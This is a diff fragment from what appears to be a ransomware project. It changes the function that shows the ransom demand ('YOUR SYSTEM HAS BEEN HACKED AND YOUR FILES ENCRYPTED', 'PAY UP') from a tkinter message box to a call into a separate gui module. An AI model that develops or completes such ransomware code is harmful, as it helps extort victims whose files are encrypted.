@@ -133,11 +133,8 @@ def encrypt_file():
 
 def message():
     # this function prompts a window containing the ransom message
-    window = tkinter.Tk()
-    window.wm_withdraw()
-    header = "HELLO. YOUR SYSTEM HAS BEEN HACKED AND YOUR FILES ENCRYPTED"
-    body = """ PAY UP """
-    messagebox.showinfo(title=header, message=body)
+    import gui
+    gui.gui()
 
 
 def ransom_note():
